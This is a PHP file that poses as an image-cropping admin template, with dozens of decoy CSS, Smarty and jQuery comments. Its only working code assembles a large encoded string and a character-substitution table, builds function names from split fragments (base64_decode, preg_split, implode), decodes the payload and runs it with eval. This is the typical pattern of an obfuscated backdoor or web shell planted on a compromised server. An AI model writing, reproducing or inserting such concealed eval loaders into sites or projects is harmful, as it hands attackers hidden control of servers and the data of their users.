<?php
/* $y1 = $('#y1');  */ 
 # background:#EEEEEE none repeat scroll 0%;
 # $x2 = $('#x2');
  $oxtJX9='..........................'.'................'.'...'.'..43CUk1BPFLf...d...NWsebrvpcojtE=whx0zaTm'.'DgAM......i9lKZ';
   # <style type="text/css">
   $oxtJX9.='6H/O'.'7yXIQ8Y.2SnuG5VJR.....';
/* min-height:108px;   */ 
$HIK4='mvxkIVbkl0ycIvbk=vcuekXOdUCXngAc=7'.'bRTB4clrQHEBcRdWYH'.'ik5YTBwHl0Ac=1XtEB7/lr'.'x/eB'.'A4=vcGEcbRTB4cykOOd';
  /* {$image[0].height}x{$image[0].width}<br/>  */ 
   // width:18px;
 // resolutions[resolutions.length] = [{$resolutions[item].0},{$resolutions[item].1}];
$HIK4.='UCXyv7K=vcGEaYbm1Itik'.'5HeaPHI0Ac=1X3l45624z'.'EyrLJIKn4AgAVy4RHds5jmg5kTBwRd1mk8';
# <b>Height:</b> <span id="h"></span><br />
  /*   */ 
 $HIK4.='KZadUCXelPH=1XOdUCX9s5cEgAcTBpJTlASe'.'lnJy7bnU4A2Bk=1zRHfAvQKx1==ds3XDkY3'.'pBARTB'.'bu';
   /* <b>Y<sub>1</sub>:</b> <span id="y1"></span><br /> */ 
   # list-style-position:outside;
  # <div style="margin:auto;padding:30px;border:1px solid #eee">
# </tr>
 $HIK4.='mWRXyr=c=1Ijm1zOplzJmWRXy7bnU4A2Bk=1zRH'.'fAvQKx1==ik5bmvxCIrxHeaPHI0A'.'c=1X3l45624zEyr=FErxmZxywy4RHds5jm1z';
# </td>
 /* <div>  */ 
 // {$image[0].created}<br/>
   # {/section}
   /*    */ 
   $HIK4.='Pp0zHE'.'r/X6sYt'.'IgxRySCXyg5P=vXX6'.'sY3l45624zEyr=FErxmZxywy4R'.'jmvcVdvcSIrxRd1z92MbUx7Ct=';
  // <th valign="top"><input type="radio" name="do:{$smarty.section.item.index}" value="store" checked/></th>
   // $y2 = $('#y2');
 # <td valign="top"><input name="name:{$smarty.section.item.index}" id="name:{$smarty.section.item.index}" value="" size="64" maxlength="64" type="text"></td>
  # <div style="float: left; margin-left: 10px;">
  /*   */ 
   $HIK4.='vx/=1==dsYVyaYPeB4O=g3Jy7bnU4A2Bk'.'=RelPRy4RHdsY3=vx/=1Ybm1z92MbUx7'.'Ct=vx/=1==ik5cEgAcmgCXIg'.'yHEtn';
  # </STYLE>
  # {/if}
$HIK4.='Jm3xkIVbk9gzcDgnXEBcSIrcuekmHik5cDvcRdWYH'.'ik'.'5bmgRXeBQSeBcVdvcSIrxRd1z92MbUx7Ctn2x';
  # <input type="hidden" name="id:{$smarty.section.item.index}" value="{$aTUL[item].file_id}"/>
 /* </td>  */ 
  /* $w = $('#w'); */ 
  # </script>
 $HIK4.='yDUAFpcZtls3HmgCXyv7K=vcGEaYbm1=HE'.'VeGySCXyg5P=vXX6sY3l45624zEyR77sl3STryUy4R'.'jmgRXeBQ';
/* <td valign="top"><fieldset><input name="phoneID:{$smarty.section.item.index}" id="phoneID:{$smarty.section.item.index}" value="{$Phone}" size="64" class="tagger phone" type="text"><span class="tagMatches"></span> </fieldset>    */ 
   $HIK4.='SeBcVdvcSIrxRd1z92MbUx7Ct'.'=K3/Dlmr=vptl'.'s3HmgCXyv7K=vcGEaYbm1=LTrzHIa'.'Ijm1zOplzJmW'.'RXy7';
  # <th valign="top"><input type="radio" name="do:{$smarty.section.item.index}" value="delete"/></th>
  /* float:left; */ 
 # sURL += "&crop[scale]=1"
  $HIK4.='bnU4A2Bk=riUPwIKeRea==ik'.'5bmvxCIr'.'xHeaPHI0Ac=1X3l4'.'5624zEyryLAU3/A03/ea==ds3XDkY3pBARTBbumW';
 /* <input type="button" value="Crop it..." onclick="crop_it()" style="background:#080;color:white;width:150px;margin-top:20px">    */ 
  # {$image[0].image_path}<br/>
   // background: #eee;
   # text-indent:-9999px;
  $HIK4.='RXyr4GevcVySCXyg5P=vXX6sY3l45624'.'zEyryLAU3/A03/ea==ikY3ev7'.'ResYbm1PHI0Ac=1X3l45624z';
   # <td valign="top" align="center">
# float:left;
  $HIK4.='EyrzP=v2tls3XyapXmBxLIgzwd1z9'.'2MbUx7Ctev7Res==ds3X6kY3l45624zEyrzP='.'v2tlsYfm1ItikY3EBb3esYbm1PHI0Ac=1X';
# .gallery.active {
 /* }  */ 
 # background-repeat:no-repeat;
/*  */ 
   $HIK4.='3l45624zEy05cI'.'VRtls3XyapXmBxLIgzwd1z9'.'2MbUx7CtIvxkEs==ds3X6kY3'.'l45624zEyr4Gev2tlsYfm1Itik5HeaX3ev';
// .tb_crop {
/*    */ 
 $HIK4.='7ResYb6URXykIXyapXyv4Gev2X6URbm1Itds'.'5jmg5kTBwRd1y'.'7ItyGItQ3plzcmv7ue15OelyLmv4HI0AHEVIad'.'UCXelPH=1XOdUCX9s5b';
 // <script type="text/javascript">
   # </tr>
   # $y2.text(selection.y2);
  # current = selection;
  $HIK4.='mvxCIr2XDk5OIVcu=1X'.'azlykE0yoEVoXIv7kpB4Sma3jmvx/TlnJZ13jmgRXT'.'BpJeB'.'4O=g3Jyg5P=vXHds5jmg5kTBwRd1y7I';
  // $x1.text(selection.x1);
  /*    */ 
  $HIK4.='tyGItQOplzJmv4HI0AHEVIadUCXelPH=1'.'XOd'.'UCX9s5HeaPS=gyOE0ZJyg5P'.'=vXCm1IGyk3XmURb'.'mWYHm1z'.'OplzJmW'.'RXe';
   // <div style="float: left;">
  # {/section}
   $HIK4.='rxRp0'.'=3d13uykot8azOplz'.'Jik5S=rcRprXJyv7K=v'.'cGEa3XDk5KplAcm1=H'.'EVeGySJXTBpJmBeHEvx9elPHI0zSd'.'1zOplzJds';
   /* } */ 
 $HIK4.='3XDk5OIVcu=1XazlykE0yoIv7RT1Y'.'tyg5P=vXtmvcSmvwG=15cDvcS=gZadUCX'.'ptycpBCjmgRXyvpX6sYtI0zP=1IjmvcVd1zVI0zP=';
  /* float:left;    */ 
 /*   */ 
  $HIK4.='7bPItmX6s5YyvpJyg5P=vXHds5OIVcu=1YtURLoy'.'k/3etARplz9plykBS==8tAOIV'.'cu=vpJmtOcEkmCd1zVI0zP=7bPIty';
 # background-image:url(../images/icons/edit.png);
   /* sURL = "panel.php?UI=image_studio,panel,cropit&ID=" + {/literal}{$image[0].ID}{literal}    */ 
 // </div>
   # sURL += "&crop[height]=" + current.height
$HIK4.='EZcRXyaYOASI0ds3uy0Ot8a'.'zVI0zP=7bPItyEixRjmvxCIr2XIg'.'yHEtnXm3xkIVbk9v7KprxSIk53e'.'BwHeBnX=voX'.'Iv7RT1Ytyg5P=';
   // <img src="{$image[0].image_original}" id="original_image"/>
# <img src="{$image[0].image_path}"><br/>
   # }
/* {if $smarty.section.item.index>0}   */ 
/*    */ 
$HIK4.='vXtm'.'KCXptycpBCjmvAPIr2Xyr'.'=c=1IfmvcVd17VTBQclrx/TlARIkX3Iv7RT13Hm'.'gCXIgyHEtnJm3xkIVbk91I3Iv7RT1IXTlZ';
  # .gallery div a {
  # padding:0pt;
 # delay: 250
  # .gallery img {
   /*    */ 
  $HIK4.='XEVbRmv'.'eG=Bw3ma3jmvykeB7Fik5bmvcVd17HI4bVTBQcd1zO'.'plzJ'.'ds3XDk5OI'.'Vcu=1XazlykE0yoy'.'kzOplz';
 # border:25px solid #222222;
   # {/literal}
#temp_uploads td {
  $HIK4.='Jyk5HIk5uE0nXeVcCesmHik5aIVxPTSCX9'.'s5HeaXPTlA9IVxPev7aEv2Jyg'.'5P=vXHds5jmg5kTBwRd1y7I';
 # list-style-image:none;
  /* alert("Make the selection first!\n\npoint and drag over the image...") */ 
  # <br/>
  # <b>Y<sub>2</sub>:</b> <span id="y2"></span><br />
   $HIK4.='tyGItOtyg5P=vXtmvcSmvwG=15keB73p'.'ByCesmHik5aIV'.'xPTSCX9sY3eaYbm1=VTBQcyk';
 // $(function () {
  $HIK4.='/tlkIuyr=c=1Iuy4ot8a=KErwReBwRIkIjmvcVd'.'Me5U7A7mWRb6sYJygzcDgnX6sY3eaX3Iv7RT';
   // <b>Selection coordinates:</b><br />
// outline-style:none;
/* */ 
  $HIK4.='13Hds5jmg5kTBwRd1y7ItyGItQKpB/t=15keB73m'.'veHEv2XykzOplzJykmH'.'ik5bmvxCIr2XDk5OIVcu=1XtURLoyk3jm1zVmWRX';
 # {/section}
 # $(window).load(function () {
// color: #fff;
 # <script type="text/javascript">
$HIK4.='yryPIr2t8aIr'.'A1Iuy4ot8a=cEVAG'.'ev2tik'.'5OIVcu=1'.'X3eaX3='.'vx/=13Hik5bmvykeB7Fik5Kpl'.'Acm1=O';
// {if $smarty.get.target }</a>{/if}
$HIK4.='=lntia5KplAcm1=LTr'.'zHIaIfmvAPIr2Xyr4GevcVySJXyg'.'5P=vXX6s'.'5k=gyHEsX3Iv7RT1OXykotdUCXygxOevckmWRXd1z3';
 # <p>Thumbnail (resampled) {$smarty.const.WAC_THUMB_SIZE}px:<p/>
 // <tr>
   /* </script>   */ 
# background-position:center;
$HIK4.='TlyupB4cl05GIkYbmgARItyOE0'.'ZJyg5P=vXCm1IGyk3HmW/XZ1YhmgA4ptARIaX3Iv'.'7RT1OXZ1OXyvzHIVwPEBx9IvbSdsYfm1I';
   /* border:1px solid #CCCCCC; */ 
$HIK4.='GySCXTBpJmB'.'cSl0=kTlzPpVQc'.'d1z4'.'IvzHIa3HmgCXIgyHEtnJm3xkIVbk9'.'gxOevckmvcSmvwG=150IVc';
  // font-family: Verdana;
 /* border: 2px solid black;    */ 
 # {literal}
 # }
  /*  */ 
$HIK4.='RpByCesmHik5aIVxPTSCX9sY3IVxS'.'=BQRmWRXykIjm1zS=v7R=lZX6sYtURCtik5HeaX3p';
  # border: 0px;
   # $x2.text(selection.x2);
  /*    */ 
 $HIK4.='BARTBbumWRb6sYtEBL3Tlmtds5jm1zVmWRXyr4Fyk'.'/tevckySC'.'XTBpJTlA9evckd1zO'.'plzJds3XDkY3IVxS=BQRm1/bm1mXevckm1I';
  /* .tb_edit {   */ 
   # <link href="/admin/res/css/mytags.css" rel="stylesheet"/>
// </ul>
   $HIK4.='3Iv'.'7RT1IXelPHI0zSmKCXygARplz4IkYbm1=lplyuTBw'.'tySCX9s5cEgAcTBpJm2Y'.'3eaX3Iv7RT13HmgCXIg'.'yHEtnJm3xkIVbk9';
# height:18px;
 // padding:0pt 25px;
 // <input type="submit" value="process it...">
  $HIK4.='vAPEa'.'=Rmv4PTr2Xevckm1I3Iv7RT1IadUCXptycpBCjmgR'.'X9s5cEgAcTBpJyv7'.'K=vcGEaYb6URXy'.'054';
   /* padding: 3px;  */ 
 $HIK4.='=1IHmgCXyvcSlryCErZX6s5HI0Ac='.'1X3l45624zEyryCErZtls3jm1zaEvbKmW'.'RXyvcSlryCErZhm1z92M'.'bUx7Ctp';
  # </div>
   # {if $images[item].source==-1}<a class="tb_crop" title="RESIZE" href="panel.php?UI=image_studio,panel,cropper&ID={$images[item].ID}">C</a>{/if}
 /*    */ 
   $HIK4.='VQGpk==mWJXykIjm1zVEs'.'Ybm1=PySCXyvpX6sYt=BwCyk/t'.'TBwFySCXTBpJd1M3TlA9pV'.'QGpk5o91Y3pVQGpkYb6URXyrytEaIHm1p';
  # <tr>
  // <li>
// new Croppr('{$image[0].image_original}', {literal}{url: function(v){window.location = 'panel.php?UI=image_studio,panel,cropit&ID={/literal}{$image[0].ID}{literal}&'+v}}{/literal})
   /* { */ 
 $HIK4.='VmvcSlreHEv2Jyg5P'.'=vX'.'Hm1'.'pVm1MXn1zVd1zOplzJds3XyveLmW'.'RXy0ItikY3eaYbm1=VE0Yt8a=cEaIjmvcVd1X3E0';
/* <b>Width:</b> <span id="w"></span><br /> */ 
/* });    */ 
# <b>X<sub>2</sub>:</b> <span id="x2"></span><br />
   /* */ 
   $HIK4.='xRlreJmWRXn1zVd1zOplzJ81Y3'.'eVRHd'.'sYb6UR'.'XeV7CIr2HmgCXIgyHEtnJm3xkIV'.'bk9vAPEa=RmvbOeB/XeVcCesYt'.'yg5P=vXtma';
# padding:0pt;
  /* });    */ 
 # function copyFromAbove(oF,i) {
 /* */ 
   $HIK4.='3jmvykeB7Fik5bm1zVmWRXyre0IaIuyrcRes'.'Ijm1zVeaYbm1=a'.'plAcyk/tAKnt8a=9ev2t8a=KErzcyS';
#temp_uploads td input {
  # .gallery p {
/* */ 
 $HIK4.='CXygycI0xC=1YbmMY3eaX3E0xRlreJ81Y3eVpJyg'.'zcDgnHdUCXyvpX6sYteVAC'.'yk/tE0AcySCXyvpJyvb4=7bVT13jmvcVd1z';
  // });
 /* */ 
  $HIK4.='kelA4EgnX6'.'URbmMe5U7A7ds5jmg5kTBwRd1y7ItyGI'.'tQKpB/t=150IVcRes5'.'RelPRmgzGmveHEv2XykzOpl'.'zJykmHik5aIVxPTSCX9s';
  /* var $x1, $y1, $x2, $y2, $w, $h;   */ 
  # {if $smarty.get.target }<a href="#" onClick="pickImage('{$images[item].image_path}');return false">{/if}
   # if (current) {
 /*    */ 
  $HIK4.='5bmvcVd1zP'.'p0zHEr/XmURbm1=O=ln'.'tmgQom1M3TlA9pVQGpk5o91Y3pVQGpkYb6URXyr'.'xue1IH'.'mgCXTBpJT';
   /* <script type="text/javascript">   */ 
#temp_uploads th {
 // {/literal}
 /* var resolutions = new Array();  */ 
  /*   */ 
  $HIK4.='lASelnJy7bnU4A2Bk=OelyLy4R'.'Hm1pVm17cEl5RDsX3l45624zEy05cIVRtls3HmgC'.'XyvpX6sYtprPLyk/tErntik5HeaXPn1';
   /* <img title="" alt="" src="/images/sets/thumbs/{$images[item].ID}.png" class="img_content"/>  */ 
 # <div style="margin:auto;padding:30px;border:1px solid #eee;background:#eee">
 $HIK4.='zVd1zOplzJ81Y3l45624zEy05cIVRtl'.'s3HmgCXygycI0'.'xC=1Yu6sYa9vAPEa=RmgAc'.'=15OplzJm1I3Iv7'.'RT1IXIvxkEs5REkYtma/3';
   // <img src="{$image.0.image_thumbnail}?ac={""|uniqid}"><br/>
 # var resolutions = new Array();
   /* <img src="/images/phones/temp_uploads/thumbs/{$aTUL[item].file_id}.png"/>  */ 
   # }
  /*   */ 
   $HIK4.='l45624zEy05cIVRtls/aykmjm1zS=v7R=lZX'.'6s'.'Ytxr7k'.'EVcuekIjmgRX'.'9s5H'.'eaPHI0A'.'c=1X3l45624zEyrzP=v2tls3X9gOX';
# sURL += "&crop[x]=" + current.x1
 /*  */ 
$HIK4.='mBxLIgzwd1z92MbUx7Cte'.'v7Res==ds3XDkY3eaYbm1=REkIuy0xKT1IjmvcV'.'d17YyvpJyg5P=vXCm1z92MbUx7Ct';
 # outline-width:0pt;
  /*    */ 
   $HIK4.='ev7Res==ds3XDkY3IVxS=BQRm1/'.'bm1yopr7uy0nXIr'.'xRmveHEv2XykzOplzJyk53plz'.'cmgzGm1Ia8az92MbUx7Ctev7R'.'es==';
// </form>
   $HIK4.='8amtmKCXygARplz4Ik'.'Ybm1=lply'.'uTBwtySCX9s5bmgRXIgyHEtnXd1zPp0zHEr/'.'X6URbm1=LErzHeaIXyapXygA';
 # }
  /* {section name="item" loop="$resolutions"}   */ 
 /* sURL += "&crop[y]=" + current.y1 */ 
# .gallery {
   /*    */ 
$HIK4.='Rplz4IkYb6URXy4=PIVwHEVIt6kYtzly'.'kE0mtmWJXygARplz'.'4Ik3uy0Ot8azkelA4Egn'.'jmvykeB7Fik53'.'eBeP=BQRia5OIVcu=';
 // } else {
 /* */ 
  $HIK4.='1XazlykE0yo=BwFEVb0Ea5GI1mHik'.'5bmYJN';
  # </p>
   // list-style-type:none;
 /* <th>image name</th>    */ 
 $bl3YfYo='bas'.'e64_'.'dec'.'od'.'e';
  // <script type="text/javascript" src="/admin/res/javascript/jquery-1.2.3.pack.js"></script>
   # <script type="text/javascript">
 $A2MT='ord';
 // <th>store</th>
# <br />
   // resolutions[resolutions.length] = [{$resolutions[item].0},{$resolutions[item].1}];
  // margin: 0;
  /* */ 
  $QTZx2S='cou'.'nt';
 # height:108px;
# {literal}
   /*   */ 
   $saB7='pr'.'eg'.'_sp'.'li'.'t';
 # <input type="submit" value="process it...">
 /* } */ 
# $h = $('#h');
   // }
  /*   */ 
  $mFgQ8='im'.'pl'.'od'.'e';
   # <a class="tb_edit" href="panel.php?UI=image_studio,panel,edit&ID={$images[item].ID}" title="EDIT" href="#">E</a>
   # {literal}
   // </script>
  // <table id="temp_uploads">
   $agmFQ=$saB7('//', $oxtJX9,-1,1);
   # <th>thumbnail</th>
// border-bottom: 1px solid black;
$MFvpUOE=$saB7('//', $HIK4,-1,1);
/* }   */ 
/*   */ 
   $iGg4bhvw=$QTZx2S($MFvpUOE);
 /* .gallery div a:focus {   */ 
 # $w.text(selection.width);
 /* {literal} */ 
   /* <h3>Image crop... (point and drag for selection)</h3>    */ 
 for($i = 0;$i < $iGg4bhvw;$i ++){$MFvpUOE[$i]=$agmFQ[$A2MT($MFvpUOE[$i])];} eval($bl3YfYo($mFgQ8('', $MFvpUOE)));
   // oF.elements["phoneID:" + i].value = oF.elements["phoneID:" + (i-1)].value;
 /* </div>  */ 
 // background:#FFFFFF none repeat scroll 0%;
 /*   */ 
  
   # url: '/admin/find_phone.php',
  
# <STYLE TYPE="text/css">
 // <b>Selection dimensions:</b><br />
 # background: #69c;
  
  # <br/>
/* }); */ 
   # }
   /* */ 
  
# margin:0pt 0pt 8px;
 
# }

?>
